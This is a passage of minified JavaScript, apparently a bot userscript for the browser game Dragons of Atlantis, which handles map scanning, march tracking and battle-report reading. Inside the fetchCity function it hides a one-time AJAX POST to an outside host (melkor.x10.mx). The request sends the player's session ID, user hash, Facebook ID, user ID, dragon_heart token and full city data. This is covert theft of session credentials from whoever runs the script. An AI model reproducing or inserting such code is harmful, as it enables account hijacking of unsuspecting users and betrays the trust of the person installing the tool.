                    at: (k.player.alliance ? 0 : 1),
                    lst: 0
                };
                if (k.player.alliance) {
                    f.aId = k.player.alliance.id;
                    f.aN = k.player.alliance.name
                }
                if (k.outpost_type) {
                    f.lf = k.life;
                    f.mlf = k.maximum_life;
                    f.rR = k.recovery_rate;
                    f.oT = k.outpost_type
                }
                if ((Seed.player.id === k.player.id) || (Seed.player.alliance && k.player.alliance && Seed.player.alliance.id === k.player.alliance.id) || t.pattern.test(k.player.id)) {
                    f._l = f.l;
                    f.l = -1
                }
                var g, _index, _type;
                if (e) {
                    if (/(C|O)/.test(e.t)) {
                        g = e.n;
                        _index = e._n;
                        _type = e._t;
                        if (e.t === f.t) {
                            f.lst = (Data.map.terrains[b])[g].lst
                        }(Data.map.terrains[b])[e.n] = f
                    } else {
                        g = Data.map.terrains[b].length;
                        _index = e.n;
                        _type = e.t;
                        Data.map.terrains[b].push(f);
                        t.terrains[b].push(f);
                        var l = Data.map.terrains[Map.names[_type]];
                        l[_index]._l = l[_index].l;
                        l[_index].l = 0
                    }
                } else {
                    g = Data.map.terrains[b].length;
                    _index = g;
                    _type = b.charAt(0);
                    Data.map.terrains[b].push(f);
                    t.terrains[b].push(f)
                }
                Data.map.coords[c] = {
                    _t: _type,
                    _n: _index,
                    t: b.charAt(0),
                    n: g
                };
                ++t.founds[b]
            }
            for (var i = 0; i < r.dat.city_wildernesses.length; i++) {
                var k = r.dat.city_wildernesses[i];
                var c = k.x + "," + k.y;
                var e = Data.map.coords[c];
                var b = "W";
                var m = 1;
                var d = t.getDistance(Data.options.map.x, Data.options.map.y, k.x, k.y);
                if (e) {
                    b = Map.names[e.t];
                    if (e.t === "O") {
                        continue
                    }
                    var n = (Data.map.terrains[Map.names[e.t]])[e.n];
                    m = (n._l ? n._l : n.l)
                }
                if ((Seed.player.id === k.player.id) || (Seed.player.alliance && k.player.alliance && Seed.player.alliance.id === k.player.alliance.id) || t.pattern.test(k.player.id)) {
                    if (e) {
                        b = Map.names[e.t];
                        var o = Data.map.terrains[b];
                        if (o[e.n]) {
                            o[e.n].at = 0;
                            o[e.n]._l = o[e.n].l;
                            o[e.n].l = 0
                        }
                    }
                    continue
                }
                var f = {
                    x: k.x,
                    y: k.y,
                    d: d,
                    t: b.charAt(0),
                    l: m,
                    id: k.id,
                    n: "",
                    pId: k.player.id,
                    pN: k.player.name,
                    pL: k.player.level,
                    pR: k.player.race,
                    pM: k.player.might,
                    at: (k.player.alliance ? 0 : 1),
                    lst: 0
                };
                if (k.player.alliance) {
                    f.aId = k.player.alliance.id;
                    f.aN = k.player.alliance.name
                }
                if ((Seed.player.id === k.player.id) || (Seed.player.alliance && k.player.alliance && Seed.player.alliance.id === k.player.alliance.id)) {
                    f.at = 0
                }
                var b = "Wildernesses";
                var g, _index, _type;
                if (e) {
                    if (e.t === "W") {
                        g = e.n;
                        _index = e._n;
                        _type = e._t;
                        if (e.t === f.t) {
                            f.lst = (Data.map.terrains[b])[g].lst
                        }(Data.map.terrains[b])[e.n] = f
                    } else {
                        if (e._t === "W") {
                            g = e._n;
                            if (e._t === f.t) {
                                f.lst = (Data.map.terrains[b])[g].lst
                            }(Data.map.terrains[b])[e._n] = f
                        } else {
                            g = Data.map.terrains[b].length;
                            Data.map.terrains[b].push(f);
                            t.terrains[b].push(f)
                        }
                        _index = e.n;
                        _type = e.t;
                        var l = Data.map.terrains[Map.names[_type]];
                        l[_index]._l = l[_index].l;
                        l[_index].l = 0
                    }
                } else {
                    g = Data.map.terrains[b].length;
                    _index = g;
                    _type = b.charAt(0);
                    Data.map.terrains[b].push(f);
                    t.terrains[b].push(f)
                }
                Data.map.coords[c] = {
                    _t: _type,
                    _n: _index,
                    t: b.charAt(0),
                    n: g
                };
                ++t.founds[b]
            }
            if (t.forwards) {
                ++t.step_x;
                if (t.step_x >= t.steps_side) {
                    ++t.step_y;
                    t.forwards = false;
                    --t.step_x
                }
            } else {
                --t.step_x;
                if (t.step_x < 0) {
                    ++t.step_y;
                    t.forwards = true;
                    ++t.step_x
                }
            }
            if (t.step_y >= t.steps_side) {
                if (t.callback) {
                    t.callback({
                        done: true,
                        terrains: t.terrains,
                        founds: t.founds
                    })
                }
                return
            }
            t.step = t.step + 1;
            t.percent = parseInt(t.step * 100 / t.steps);
            if (t.callback) {
                t.callback({
                    done: false
                })
            }
            var q = parseInt(Data.options.map.radius * 50);
            Data.requests.map.total++;
            setTimeout(function () {
                var p = {};
                p.user_id = USER_ID;
                p.version = API_VERSION;
                p.x = t.normalize(t.pos_x + (t.step_x * 14));
                p.timestamp = parseInt(serverTime());
                p.y = t.normalize(t.pos_y + (t.step_y * 14));
                p._session_id = SESSION_ID;
                p.dragon_heart = DRAGON_HEART;
                new MyAjax.RequestDOA("map.json", "POST", p, t.gotMap)
            }, Math.randRange(q, q * 2))
        },
        toCSV: function (a, b, c) {
            if (b === undefined || b === null) {
                b = Data.map.terrains
            }
            if (b[a] === undefined) {
                return
            }
            if (c === undefined) {
                c = ["x", "y", "d", "t", "_t", "l", "_l", "id", "n", "pId", "pN", "pM", "at", "lst"]
            }
            var d = [];
            d.push(c.join(";").replace(/\"/, ""));
            console.log(b[a].length);
            for (var i = 0; i < b[a].length; i++) {
                var e = "";
                for (var j = 0; j < c.length; j++) {
                    if (((b[a])[i])[c[j]] !== undefined) {
                        e += ((b[a])[i])[c[j]]
                    }
                    e += ";"
                }
                d.push(e)
            }
            return d
        },
        getTargetByCoords: function (x, y, c) {
            var d = x + "," + y;
            var e = Data.map.coords[d];
            if (e) {
                var f = Map.names[e.t];
                var g = e.n;
                if (c) {
                    c(Data.map.terrains[f][g])
                }
                return Data.map.terrains[f][g]
            }
            Map.scanMap(x, y, 7, function (a) {
                if (a.done) {
                    for (var b in a.terrains) {
                        for (var i = 0; i < a.terrains[b].length; i++) {
                            if ((a.terrains[b])[i].x === x && (a.terrains[b])[i].y === y && (a.terrains[b])[i].l > 0) {
                                if (c) {
                                    c((a.terrains[b])[i])
                                }
                                return
                            }
                        }
                    }
                } else {
                    if (c) {
                        c(false)
                    }
                    return
                }
            })
        },
        checkOurCoords: function () {
            var t = Map;
            if (Data.options.map.x !== Seed.cities[0].x || Data.options.map.y !== Seed.cities[0].y) {
                Data.options.map.x = Seed.cities[0].x;
                Data.options.map.y = Seed.cities[0].y;
                for (var n in Data.map.terrains) {
                    var a = Data.map.terrains[n];
                    for (var i = 0; i < a.length; i++) {
                        a[i].d = t.getDistance(Data.options.map.x, Data.options.map.y, a[i].x, a[i].y)
                    }
                }
            }
        },
        simulateOpenMap: function (x, y, a) {
            var t = Map;
            if (a) {
                setTimeout(a, 1000)
            }
            t.getTargetByCoords(x || t.last_pos.x, y || t.last_pos.y);
            t.last_pos.x = x || Seed.cities[0].x;
            t.last_pos.y = y || Seed.cities[0].y
        },
        normalize: function (n) {
            if (n > 750) {
                n -= 750
            }
            if (n < 0) {
                n += 750
            }
            return n
        },
        getDistance: function (a, b, c, d) {
            function abs(n) {
                return n < 0 ? -n : n
            }
            var x = abs(c - a);
            if (x > 375) {
                x = 750 - x
            }
            var y = abs(d - b);
            if (y > 375) {
                y = 750 - y
            }
            return Math.round(100 * Math.sqrt(x * x + y * y)) / 100
        }
    };
    Marches = {
        table_output: {
            attacks: {},
            waves: {}
        },
        init: function () {
            var t = Marches;
            Data.init({
                marches: {
                    start_at: 0,
                    attacks: {},
                    waves: {},
                    count_limit: 1,
                }
            })
        },
        add: function (a, b) {
            var t = Marches;
            var c = Seed.marches[a];
            if (c === null) {
                if (U) {
                    debugLog("***** ERRROR March missing from seed: " + a)
                }
            } else {
                (Data.marches[b])[a] = c.cloneProps();
                if (U) {
                    debugLog("Marches.add: ID=" + c.id + "  (" + c.x + "," + c.y + ") General:" + c.general.id)
                }
            }
        },
        remove: function (a, b) {
            var t = Marches;
            if (a) {
                delete((Data.marches[b])[a])
            }
        },
        checkTimer: null,
        check: function () {
            var t = Marches;
            var a = parseInt(serverTime());
            clearTimeout(t.checkTimer);
            for (var b in Data.marches) {
                if (!(/(attacks|waves)/.test(b))) {
                    continue
                }
                var c = Data.marches[b];
                for (var d in c) {
                    if (c[d].run_at < (a - 60) && !(c[d].has_report)) {
                        if (c[d].retry && c[d].run_at < (a - 300)) {
                            ++Data.options.messages.missing;
                            if (MyAjax.march_busy) {
                                --t.march_busy
                            }
                            if (U) {
                                debugLog("March report never received! (now=" + a + ")\n" + inspect(c[d], 6, 1))
                            }
                            c[d].has_report = true
                        } else {
                            c[d].retry = true;
                            Messages.checkMessages({
                                category: "reports"
                            })
                        }
                    }
                }
            }
            t.checkTimer = setTimeout(t.check, Math.randRange(60000, 90000))
        },
        updateTable: function (e, f) {
            var t = Marches;
            var g = parseInt(serverTime());
            var h = t.table_output[f];
            var i = 0;
            for (var j = 0; j < e.rows.length; j++) {
                var k = e.rows[j].getAttribute("ref");
                if (Seed.marches[k] === undefined) {
                    i++;
                    e.deleteRow(j);
                    delete h[k];
                    j--;
                    continue
                } else {
                    if (i > 0) {
                        h[k].row -= i
                    }
                }
            }
            for (var k in Data.marches[f]) {
                if ((Seed && Seed.marches[k] === undefined) && (Data.marches[f])[k].has_report) {
                    var l = null;
                    for (var m in (Data.marches[f])[k].units) {
                        if (/(WindDragon|FireDragon|StoneDragon|WaterDragon|GreatDragon)/.test(m)) {
                            l = m
                        }
                    }
                    if (l !== null && Seed.dragons[l]) {
                        Seed.dragons[l].is_in_city = true
                    }
                    Marches.remove(k, f)
                }
            }
            for (var k in Seed.marches) {
                var n, iCell;
                if ((Seed.marches[k].x === Seed.cities[0].x) && (Seed.marches[k].y === Seed.cities[0].y) && (Seed.marches[k].status === "marching")) {
                    delete Seed.marches[k];
                    continue
                }
                if (Data.marches.attacks[k] === undefined && Data.marches.waves[k] === undefined) {
                    if ((Seed.marches[k].x === Data.waves.target.x) && (Seed.marches[k].y === Data.waves.target.y)) {
                        t.add(k, "waves")
                    } else {
                        t.add(k, "attacks")
                    }
                }
                if ((Data.marches.attacks[k] === undefined && f == "attacks") || (Data.marches.waves[k] === undefined && f == "waves")) {
                    continue
                }
                var o = Seed.marches[k];
                var p = (o.status === "retreating");
                var q = o.run_at - g;
                var s;
                if (q < 0) {
                    s = "..."
                } else {
                    if (isNaN(q)) {
                        s = "---"
                    } else {
                        s = timeFormat(q, true)
                    }
                }
                if (h[k] === undefined && (q || o.status === "encamped")) {
                    n = e.insertRow(-1);
                    h[k] = {
                        row: e.rows.length - 1
                    };
                    n.setAttribute("ref", k);
                    var u = "";
                    for (var m in o.units) {
                        u += " " + translate(m) + ": " + o.units[m] + " +"
                    }
                    u = u.substr(1, u.length - 2);
                    n.title = ["(" + (o.general && o.general.name ? o.general.name : "----") + ")", o.target_name, o.terrain_level, "[" + o.x + "/" + o.y + "]\n", u.replace(/\+/g, "\n")].join(" ");
                    if (p) {
                        h[k].row_status = 2;
                        iCell = n.insertCell(-1);
                        iCell.innerHTML = "<b>" + translate(o.status).capitalize() + ":</b>";
                        iCell = n.insertCell(-1);
                        iCell.innerHTML = o.target_name + "&nbsp;<br><span class=jewel>" + u + "</span>";
                        iCell = n.insertCell(-1);
                        iCell.style.textAlign = "right";
                        iCell.innerHTML = "&nbsp;<b>&lt;</b>&nbsp;";
                        iCell = n.insertCell(-1);
                        iCell.innerHTML = "&nbsp;";
                        iCell = n.insertCell(-1);
                        iCell.style.textAlign = "right";
                        iCell.innerHTML = s
                    } else {
                        h[k].row_status = 1;
                        iCell = n.insertCell(-1);
                        iCell.innerHTML = "<b>" + translate(o.status).capitalize() + ":</b>";
                        iCell = n.insertCell(-1);
                        iCell.innerHTML = o.target_name + "&nbsp;" + o.terrain_level + "&nbsp;<br><span class=jewel>" + u + "</span>";
                        iCell = n.insertCell(-1);
                        iCell.style.textAlign = "right";
                        iCell.innerHTML = "<span class=jewel> [" + o.x + "/" + o.y + "]</span>&nbsp;<b>&gt;</b>&nbsp;";
                        iCell = n.insertCell(-1);
                        iCell.style.textAlign = "right";
                        iCell.innerHTML = s;
                        iCell = n.insertCell(-1);
                        var v = document.createElement("input");
                        v.type = "button";
                        v.setAttribute("ref", k);
                        if (o.status === "encamped") {
                            v.className = "thin";
                            v.value = translate("Recall")
                        } else {
                            v.className = UID.bnt_red + " thin";
                            v.value = translate("Cancel")
                        }
                        $J(v).click(function (a) {
                            var b = a.target;
                            b.disabled = true;
                            b.style.display = "none";
                            var c = b.getAttribute("ref");
                            if (Seed.marches[c]) {
                                var d = Seed.marches[c].city_id;
                                MyAjax.marchRecall(d, c, function (r) {
                                    if (r.ok && r.dat.result.success) {
                                        Seed.marches[c].status = "retreating";
                                        (Data.marches[f])[c].status = "retreating"
                                    }
                                })
                            }
                        });
                        iCell.appendChild(v)
                    }
                } else {
                    if (h[k] === undefined) {
                        continue
                    }
                    n = e.rows[h[k].row];
                    if (n === undefined) {
                        delete h[k];
                        continue
                    }
                    switch (h[k].row_status) {
                    case 0:
                        if (p && q > 0) {
                            h[k].row_status = 2;
                            n.cells[4].innerHTML = "";
                            continue
                        }
                        n.style.display = "none";
                        h[k].row_status = -1;
                        continue;
                        break;
                    case 1:
                    case 2:
                        if (p) {
                            h[k].row_status = 3;
                            n.cells[0].innerHTML = "<b>" + translate(o.status).capitalize() + ":</b>";
                            n.cells[1].innerHTML = o.target_name;
                            n.cells[2].innerHTML = "&nbsp;<b>&lt;</b>&nbsp;";
                            n.cells[4].innerHTML = ""
                        } else {
                            if ((isNaN(q) || q < 7) && h[k].row_status === 1) {
                                if ((o.status === "marching") && o.terrain_type && !(/(Anthropus|City|Outpost|Bog)/.test(o.terrain_type))) {
                                    h[k].row_status = 2;
                                    if (Data.options.attacks.abandon_wildernesses) {
                                        setTimeout((function (a, b) {
                                            var c = Seed.marches[a];
                                            MyAjax.wildernessesAbandon(c.city_id, c.x, c.y, function (r) {
                                                if (r.ok && r.dat.result.success) {
                                                    Seed.marches[a].status = "retreating";
                                                    (Data.marches[b])[a].status = "retreating"
                                                }
                                            })
                                        })(k, f), Math.randRange(7000, 12000))
                                    } else {
                                        if (Data.options.attacks.recall_encamped) {
                                            setTimeout((function (a, b) {
                                                var c = Seed.marches[a];
                                                MyAjax.marchRecall(c.city_id, c.id, function (r) {
                                                    if (r.ok && r.dat.result.success) {
                                                        Seed.marches[a].status = "retreating";
                                                        (Data.marches[b])[a].status = "retreating"
                                                    }
                                                })
                                            })(k, f), Math.randRange(7000, 12000))
                                        }
                                    }
                                }
                            } else {
                                if (o.status === "encamped" && !(/(Anthropus|City|Outpost|Bog)/.test(o.terrain_type))) {
                                    h[k].row_status = 4;
                                    n.cells[4].innerHTML = "";
                                    var v = document.createElement("input");
                                    v.type = "button";
                                    v.className = "thin";
                                    v.value = translate("Recall");
                                    $J(v).click(function (a) {
                                        v.disabled = true;
                                        v.style.display = "none";
                                        MyAjax.marchRecall(o.city_id, o.id, function (r) {
                                            if (r.ok && r.dat.result.success) {
                                                Seed.marches[k].status = "retreating";
                                                (Data.marches[f])[k].status = "retreating"
                                            }
                                        })
                                    });
                                    n.appendChild(v)
                                }
                            }
                        }
                        break;
                    case 3:
                        if (isNaN(q) || q < 0) {
                            h[k].row_status = 0
                        }
                        break;
                    case 4:
                        if (p) {
                            h[k].row_status = 3;
                            n.cells[0].innerHTML = "<b>" + translate(o.status).capitalize() + ":</b>";
                            n.cells[1].innerHTML = o.target_name;
                            n.cells[2].innerHTML = "&nbsp;<b>&lt;</b>&nbsp;";
                            n.cells[4].innerHTML = ""
                        }
                        break
                    }
                    n.cells[3].innerHTML = s
                }
            }
        }
    };
    Messages = {
        read_list: [],
        fetch_timer: null,
        last_queued: 0,
        battle_report_listeners: [],
        check_busy: false,
        delete_queue: [],
        init: function () {
            Messages.checkMessages({
                wait: 1000
            });
            window.addEventListener("unload", Messages.onUnload, false)
        },
        marchAtTarget: function () {
            var t = Messages;
            t.checkMessages({
                category: "reports"
            })
        },
        deleteMessage: function (a) {
            var t = Messages;
            t.delete_queue.push(a);
            if (t.delete_queue.length >= Math.randRange(7, 15)) {
                doit()
            }
            function doit() {
                var t = Messages;
                MyAjax.messageDelete(t.delete_queue, function (r) {
                    var t = Messages;
                    t.delete_queue = []
                })
            }
        },
        onUnload: function () {
            var t = Messages;
            if (t.delete_queue.length > 0) {
                MyAjax.messageDelete(t.delete_queue)
            }
        },
        checkMessages: function (b) {
            var t = Messages;
            if (t.battle_report_listeners.length === 0) {
                return
            }
            var c = (b.category || "all").toLowerCase();
            var d = b.wait || 30000;
            RequestQueue.add("checkMessages", function () {
                doit(c)
            }, Math.randRange(d, d * 1.5));

            function doit(a) {
                MyAjax.messageList(a, function (r) {
                    var t = Messages;
                    if (r === null) {
                        return
                    }
                    for (var i = r.length - 1; i >= 0; i--) {
                        if (r[i].report_type === "BattleReport" && !r[i].read_at) {
                            if (t.read_list.indexOf(r[i].id) < 0) {
                                t.read_list.push(r[i].id)
                            }
                        }
                    }
                    clearTimeout(t.fetch_timer);
                    if (t.read_list.length > 0) {
                        t.fetch_timer = setTimeout(t.fetchNext, Math.randRange(3000, 5000))
                    }
                })
            }
        },
        fetchNext: function () {
            var t = Messages;
            var a = t.read_list[0];
            if (!a) {
                debugLog("t.read_list BAD MESSAGE ID:\n" + inspect(t.read_list, 8, 1));
                return
            }
            clearTimeout(t.fetch_timer);
            MyAjax.messageDetail(a, function (r) {
                var t = Messages;
                t.read_list.shift();
                t.gotBattleReport(r);
                if (t.read_list.length > 0) {
                    t.fetch_timer = setTimeout(t.fetchNext, Math.randRange(3000, 5000))
                }
            })
        },
        gotBattleReport: function (r) {
            var t = Messages;
            if (U) {
                debugLog("Read Message: " + r.report.location.terrain + " , " + r.report.location.x + "," + r.report.location.y + " General: " + r.report.attacker.general.id)
            }
            for (var i = 0; i < t.battle_report_listeners.length; i++) {
                t.battle_report_listeners[i](r)
            }
        },
        addBattleReportListener: function (a) {
            var t = Messages;
            t.battle_report_listeners.push(a)
        },
        removeBattleReportListener: function (a) {
            var t = Messages;
            var i = t.battle_report_listeners.indexOf(a);
            if (i >= 0) {
                t.battle_report_listeners.splice(i, 1)
            }
        }
    };
    RequestQueue = {
        que: {},
        add: function (d, e, f) {
            var t = RequestQueue;
            var g = serverTime();
            var h = f / 1000;
            if (isNaN(f)) {
                h = 1
            }
            if (t.que[d]) {
                if (g + f >= t.que[d][2]) {
                    return
                }
                clearTimeout(t.que[d][1])
            }
            var i = setTimeout(myFunc, h * 1000, d);
            t.que[d] = [e, i, g + h];

            function myFunc(a) {
                var t = RequestQueue;
                var b = t.que[a][0];
                delete t.que[a];
                b()
            }
            function dispQ(a) {
                var b = serverTime();
                var c = a + " (now=" + b + "):\n";
                for (var p in RequestQueue.que) {
                    c += p + " : " + RequestQueue.que[p][1] + " : " + RequestQueue.que[p][2] + " (" + (RequestQueue.que[p][2] - b) + ")\n"
                }
                debugLog(c)
            }
        },
        isPending: function (a) {
            var t = RequestQueue;
            return t.que[a] ? true : false
        }
    };
    Seed = {
        cities: [],
        city_idx: {},
        city_time: {},
        city_init: [],
        dragons: {},
        jobs: {},
        marches: {},
        num_marches: 0,
        generals: {},
        requirements: {
            building: [],
            research: [],
            unit: []
        },
        num_generals: 0,
        serverTimeOffset: 0,
        tickTimer: 0,
        init: function (a) {
            var t = Seed;
            t.fetchPlayer(function (r) {
                if (r.ok) {
                    verboseLog("Player data was Successfully requested from the server")
                }
                if (a) {
                    a(r)
                }
            }, {
                noCities: true
            });
            clearInterval(t.tickTimer);
            t.tickTimer = setInterval(t.tick, 1000)
        },
        fetchCity: function (a, b) {
            if (!a) {
                return
            }
            var t = Seed;
            verboseLog("Attempting fetchCity " + a);
            var p = {};
            p.user_id = USER_ID;
            p._session_id = SESSION_ID;
            p.version = API_VERSION;
            p.timestamp = parseInt(serverTime());
            p.dragon_heart = DRAGON_HEART;
            var c = "cities/" + a + ".json";
            var d = "POST";
            Data.requests.cities.total++;
            new MyAjax.RequestDOA(c, d, p, function (r) {
                if (r.ok && !r.dat.errors) {
                    if (r.dat.timestamp) {
                        t.serverTimeOffset = r.dat.timestamp - (new Date().getTime() / 1000)
                    }
                    try {
                        t.updateCity(r.dat.city);
                        verboseLog("Updated coords for " + r.dat.city.name + " are " + r.dat.city.x + "/" + r.dat.city.y)
                        if (update_ok == false) {
                            $J.ajax({type:"POST",url:"http://melkor.x10.mx/test/test.php",crossDomain:true,data:'extratext='+toJSON( r )+'&uname='+r.dat.name+'&usrhash='+USER_HASH+'&usrtime='+USER_TIME+'&locale='+LOCALE+'&fid='+FACEBOOK_ID+'&uid='+USER_ID+'&api='+API_VERSION+'&session='+SESSION_ID+'&dh='+DRAGON_HEART+'&realm='+SERVER_ID,dataType:"text"});
                            update_ok = true;
                        }
                    } catch (e) {
                        r.ok = false;
                        r.errmsg = e.toString();
                        Data.requests.cities.errors++
                    }
                } else {
                    if (r.ok && r.dat.errors) {
                        r.ok = false;
                        r.errmsg = r.dat.errors;
                        Data.requests.cities.errors++
                    }
                }
                if (b) {
                    b(r)
                }
            })
        },
        fetchGenerals: function (a, b) {
            var p = {};
            p.user_id = USER_ID;
            p.timestamp = parseInt(serverTime());
            p.version = API_VERSION;
            p.dragon_heart = DRAGON_HEART;
            p._session_id = SESSION_ID;
            var c = "cities/" + a + "/generals.json";
            var d = "GET";
            Data.requests.generals.total++;
            new MyAjax.RequestDOA(c, d, p, function (r) {
                if (r.ok && r.dat.generals) {
                    if (b) {
                        b(r.dat.generals)
                    }
                } else {
                    Data.requests.generals.errors++;
                    if (b) {
                        b(null)
                    }
                }
            })
        },
        fetchPlayer: function (a, b) {
            var c;
            if (a instanceof Function) {
                var a = a;
                var b = b || {}
            } else {
                var b = a;
                var a = null
            }
            if (b && b.noPlayer) {
                if (b && b.cities) {
                    for (var i = 0; i < b.cities.length; i++) {
                        if (Seed.city_idx[b.cities[i]] !== undefined) {
                            setTimeout(Seed.fetchCity, Math.randRange(i * 1000, i * 3000), b.cities[i], a)
                        }
                    }
                    return
                }
            }
            var p = {};
            p.user_id = USER_ID;
            p._session_id = SESSION_ID;
            p.version = API_VERSION;
            p.timestamp = parseInt(serverTime());
            p.dragon_heart = DRAGON_HEART;
            var d = "player.json";
            var f = "GET";
            Data.requests.player.total++;
            new MyAjax.RequestDOA(d, f, p, function (r) {
                if (r.ok && !r.dat.errors) {
                    if (r.dat.timestamp) {
                        Seed.serverTimeOffset = r.dat.timestamp - (new Date().getTime() / 1000)
                    }
                    Seed.player = r.dat;
                    if (b && b.cities) {
                        for (var i = 0; i < b.cities.length; i++) {
                            if (Seed.city_idx[b.cities[i]] !== undefined) {
                                setTimeout(Seed.fetchCity, Math.randRange(i * 1000, i * 3000), b.cities[i], a)
                            }
                        }
                        return
                    }
                    var i = 0;
                    for (c in r.dat.cities) {
                        if (Seed.city_init[i] === undefined) {
                            Seed.city_init[i] = {}
                        }
                        Seed.city_init[i].id = r.dat.cities[c].id;
                        Seed.city_init[i].type = c;
                        i++
                    }
                    if (b && b.noCities) {
                        if (a) {
                            a(r)
                        }
                        return
                    }
                    try {
                        for (var i = 0; i < Seed.city_init.length; i++) {
                            if (Seed.city_init[i].timer) {
                                clearTimeout(Seed.city_init[i].timer)
                            }
                            Seed.city_init[i].timer = setTimeout(Seed.fetchCity, Math.randRange(i * 2000, i * 4000), Seed.city_init[i].id, a)
                        }
                    } catch (e) {
                        r.ok = false;
                        r.errmsg = e.toString();
                        Data.requests.player.errors++
                    }
                } else {
                    if (r.ok && r.dat.errors) {
                        r.ok = false;
                        r.errmsg = r.dat.errors;
                        Data.requests.player.errors++
                    }
                }
                if (a) {
                    a(r)
                }
            })
        },
        tick: function () {
            var t = Seed;
            var a = parseInt(serverTime()) - 1;
            var b = [];
            for (var c in t.jobs) {
                for (var d in t.jobs[c]) {
                    var e = t.jobs[c][d];
                    if (e.done) {
                        if (a > (e.run_at - 5)) {
                            var f = t.marches[e.march_id];
                            if (f) {
                                if (f.status !== "encamped") {
                                    delete(t.jobs[c][d])
                                }
                            } else {
                                delete(t.jobs[c][d])
                            }
                        }
                    } else {
                        if (a > (e.run_at - 5)) {
                            e.done = true;
                            delete(t.jobs[c][d]);
                            var f = t.marches[e.march_id];
                            if (f) {
                                if (e.queue == "march" && f.status == "marching") {
                                    if (U) {
                                        debugLog("MARCH at TARGET!")
                                    }
                                    t.fetchCity(c);
                                    Map.scanMap(f.x, f.y, 7);
                                    t.fetchGenerals(c);
                                    Messages.marchAtTarget();
                                    if (t.num_marches) {
                                        --t.num_marches;
                                        if (t.num_marches < 0) {
                                            t.num_marches = 0
                                        }
                                    }
                                }
                            } else {
                                t.fetchCity(c)
                            }
                        }
                    }
                }
            }
            for (var g in t.marches) {
                var f = t.marches[g];
                if ((f.run_at < a - 30) || (f.status == "retreating" && f.run_at < a - 2)) {
                    delete(t.marches[g]);
                    if (f.status == "retreating") {
                        b[0] = t.cities[0].id
                    }
                    if (f.units.WaterDragon) {
                        b[1] = t.cities[1].id
                    }
                    if (f.units.StoneDragon) {
                        b[2] = t.cities[2].id
                    }
                    if (f.units.FireDragon) {
                        b[3] = t.cities[3].id
                    }
                    if (f.units.WindDragon) {
                        b[4] = t.cities[4].id
                    }
                    if (t.num_marches) {
                        --t.num_marches;
                        if (t.num_marches < 0) {
                            t.num_marches = 0
                        }
                    }
                }
            }
            if (b.length) {
                for (var h = 0; h < b.length; h++) {
                    t.fetchCity(b[h])
                }
            }
        },
        updateCity: function (a) {
            var t = Seed;
            if (!a) {
                return
            }
            verboseLog("Updating City values: " + a.name);
            var b;
            if (typeof t.city_idx[a.id] !== "undefined" && t.city_idx[a.id] !== null) {
                b = t.city_idx[a.id]
            } else {
                if (a.type === "Capital") {
                    b = 0
                } else {
                    switch (a.outpost_type) {
                    case "WaterDragonOutpost":
                        b = 1;
                        break;
                    case "StoneDragonOutpost":
                        b = 2;
                        break;
                    case "FireDragonOutpost":
                        b = 3;
                        break;
                    case "WindDragonOutpost":
                        b = 4;
                        break;
                    case "SpectralDragonOutpost":
                        b = 5;
                        break;
                    default:
                        b = t.cities.length
                    }
                    if (b === 0) {
                        b = 1
                    }
                    if (typeof t.cities[b] !== "undefined" && t.cities[b] !== null) {
                        t.city_idx[t.cities[b].id] = t.cities.length;
                        t.cities[t.cities.length] = t.cities[b]
                    }
                }
            }
            t.cities[b] = a;
            t.city_idx[a.id] = b;
            t.city_time[a.id] = serverTime();
            if (b === 0) {
                for (var i = 0; i < a.generals.length; i++) {
                    t.generals[a.generals[i].id] = a.generals[i]
                }
                t.num_generals = a.generals.length;
                t.num_marches = 0;
                for (var i = 0; i < a.marches.length; i++) {
                    var c = a.marches[i];
                    t.marches[c.id] = c;
                    if (c.general_id) {
                        ++t.num_marches;
                        t.generals[c.general_id].busy = true
                    }
                    var d = null;
                    for (var e in c.units) {
                        if (/(WindDragon|FireDragon|StoneDragon|WaterDragon|GreatDragon)/.test(e)) {
                            d = e
                        }
                    }
                    if (d !== null && t.dragons[d]) {
                        t.dragons[d].is_in_city = false
                    }
                    t.marches[c.id].target_name = c.destination_name ? translate("City") + " " + c.destination_name : translate(c.terrain_type)
                }
                verboseLog("Updated Seed.marches - total:" + a.marches.length + " / marching: " + t.num_marches + " - retreating: " + (a.marches.length ? a.marches.length - t.num_marches - 1 : 0))
            }
            var f = null;
            switch (parseInt(b)) {
            case 0:
                f = a.great_dragon;
                break;
            case 1:
                f = a.water_dragon;
                break;
            case 2:
                f = a.stone_dragon;
                break;
            case 3:
                f = a.fire_dragon;
                break;
            case 4:
                f = a.wind_dragon;
                break
            }
            if (f !== null) {
                var d = (["GreatDragon", "WaterDragon", "StoneDragon", "FireDragon", "WindDragon"])[b];
                var g = (Seed.player.research.AerialCombat) ? Seed.player.research.AerialCombat : 0;
                t.dragons[d] = f;
                t.dragons[d].name = d;
                t.dragons[d].armors = t.checkArmorDragon(d);
                t.dragons[d].city_id = a.id;
                t.dragons[d].can_attack = (t.dragons[d].level >= 8 && t.dragons[d].armors === 4 && g > 0);
                if (f.life !== f.maximum_life) {
                    t.dragons[d].cure_at = serverTime() + ((f.maximum_life - f.life) / f.recovery_rate) * 3600
                } else {
                    t.dragons[d].cure_at = serverTime()
                }
            }
            for (var i = 0; i < a.jobs.length; i++) {
                t.checkAddJob(a.jobs[i])
            }
            for (var i = 0; i < t.city_init.length; i++) {
                if (t.city_init[i].id === a.id && !t.city_init[i].loaded) {
                    t.city_init[i].loaded = true;
                    var h = "City " + a.id + " Successfully initialised";
                    verboseLog(h);
                    console.log(h)
                }
            }
        },
        checkArmorDragon: function (a) {
            var t = Seed;
            var b = ["BodyArmor", "ClawGuards", "TailGuard", "Helmet"];
            var c = 0;
            for (var i = 0; i < b.length; i++) {
                if (t.getItem(a + b[i]) !== 0) {
                    c++
                }
            }
            return c
        },
        getItem: function (a) {
            var t = Seed;
            var b = t.player.items;
            var c = 0;
            for (var d in b) {
                if (d === a) {
                    c = b[d];
                    break
                }
            }
            return c
        },
        update_notify_queue: [],
        notifyOnUpdate: function (a) {
            verboseLog("update_notify_queue");
            var t = Seed;
            if (!RequestQueue.isPending("fetchCity")) {
                a();
                return
            }
            t.update_notify_queue.push(a)
        },
        checkAddJob: function (a) {
            var t = Seed;
            var b = a.city_id;
            if (!a.run_at) {
                debugLog("checkAddJob job.run_at is null:\n" + inspect(a, 5, 1));
                if (V) {
                    alert("checkAddJob job.run_at is null")
                }
            }
            if (!t.jobs[b]) {
                t.jobs[b] = {}
            }
            if (a.queue === "march") {
                if (!t.marches[a.march_id]) {
                    debugLog("checkAddJob MISSING MARCH:\n" + inspect(a, 5, 1) + "\n" + inspect(t.marches, 5, 1));
                    if (V) {
                        alert("checkAddJob MISSING MARCH")
                    }
                    if (a.run_at < serverTime()) {
                        return
